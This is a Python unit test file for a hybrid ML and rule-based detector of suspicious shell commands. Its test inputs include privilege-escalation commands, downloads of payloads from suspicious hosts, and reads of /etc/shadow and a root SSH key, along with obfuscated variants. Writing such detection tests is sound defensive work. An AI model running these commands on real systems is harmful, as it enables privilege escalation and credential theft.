
import unittest
import time
import sys
import os
from pathlib import Path

# Add src to path
sys.path.append(os.path.abspath(os.path.join(os.getcwd(), 'src')))

from cyanide.ml.pipeline import CyanideML
from cyanide.ml.rule_engine import SecurityRuleEngine
from cyanide.ml.context_analyzer import ContextAnalyzer

class TestHybridSystem(unittest.TestCase):
    
    @classmethod
    def setUpClass(cls):
        print("[*] Setting up Hybrid System for testing...")
        cls.pipeline = CyanideML(Path("assets/models"))
        # Force reload rules if needed
        cls.pipeline.rule_engine = SecurityRuleEngine()

    def test_rule_engine_privesc(self):
        """Test Privilege Escalation rules"""
        commands = [
            ("sudo su", True, "T1548.003"),
            ("sudo -i", True, "T1548.003"),
            ("chmod +s /bin/bash", True, "T1548.001"),
            ("ls -la", False, None)
        ]
        engine = SecurityRuleEngine()
        for cmd, expected_match, expected_tech in commands:
            result = engine.evaluate(cmd)
            self.assertEqual(result['matched'], expected_match, f"Failed on {cmd}")
            if expected_match:
                self.assertEqual(result['technique'], expected_tech)

    def test_context_analyzer_urls(self):
        """Test URL analysis"""
        analyzer = ContextAnalyzer()
        
        # Safe URL
        safe = analyzer.analyze_url("wget https://github.com/user/repo")
        self.assertEqual(safe['verdict'], 'safe')
        self.assertTrue("github.com" in safe['urls'][0])

        # Malicious URL (TLD)
        mal = analyzer.analyze_url("curl http://malware.xyz/payload")
        self.assertEqual(mal['verdict'], 'suspicious')
        self.assertTrue("Suspicious TLD: .xyz" in mal['flags'])
        
        # Malicious URL (IP)
        ip_url = analyzer.analyze_url("wget http://192.168.1.100/script.sh")
        self.assertEqual(ip_url['verdict'], 'suspicious')

    def test_context_analyzer_paths(self):
        """Test Sensitive Path analysis"""
        analyzer = ContextAnalyzer()
        
        res = analyzer.analyze_file_paths("cat /etc/shadow")
        self.assertTrue(res['matched'])
        self.assertEqual(res['severity'], 'CRITICAL')
        
        res = analyzer.analyze_file_paths("echo hello")
        self.assertFalse(res['matched'])

    def test_hybrid_integration_fusion(self):
        """Test end-to-end hybrid fusion logic"""
        # Case 1: Clean Command -> Clean
        res = self.pipeline.analyze_command("ls -la")
        self.assertEqual(res['verdict'], 'clean', "ls -la should be clean")
        
        # Case 2: ML Misses but Rule Catches (e.g. sudo su)
        # Note: Autoencoder might miss sudo su due to low reconstruction error
        res = self.pipeline.analyze_command("sudo su")
        self.assertEqual(res['verdict'], 'anomaly', "sudo su should be anomaly (Rule)")
        self.assertEqual(res['fusion_source'], 'rule')
        self.assertEqual(res['classification']['technique']['id'], 'T1548.003')

        # Case 3: ML Misses but Context Catches (e.g. sensitive path)
        res = self.pipeline.analyze_command("cat /root/.ssh/id_rsa")
        self.assertEqual(res['verdict'], 'anomaly')
        # Could be Rule or Context depending on overlap, but definitely Anomaly
        
    def test_adversarial_cases(self):
        """Test Adversarial / Obfuscated commands"""
        # 1. Multiple spaces (Should be handled by tokenizer/regex)
        res = self.pipeline.analyze_command("sudo    su") 
        self.assertEqual(res['verdict'], 'anomaly', "Failed on extra spaces")
        
        # 2. Case mixing (Regex ignorecase)
        res = self.pipeline.analyze_command("SUDO SU")
        self.assertEqual(res['verdict'], 'anomaly', "Failed on case mixing")
        
        # 3. Concatenation
        res = self.pipeline.analyze_command("ls; sudo su; id")
        self.assertEqual(res['verdict'], 'anomaly', "Failed on concatenation")

    def test_performance(self):
        """Benchmark latency"""
        start_time = time.time()
        for _ in range(100):
            self.pipeline.analyze_command("ls -la")
        duration = time.time() - start_time
        avg_latency = (duration / 100) * 1000 # ms
        
        print(f"\n[PERF] Average Latency: {avg_latency:.2f} ms")
        self.assertLess(avg_latency, 20.0, "Latency too high (>20ms)")

if __name__ == "__main__":
    unittest.main()
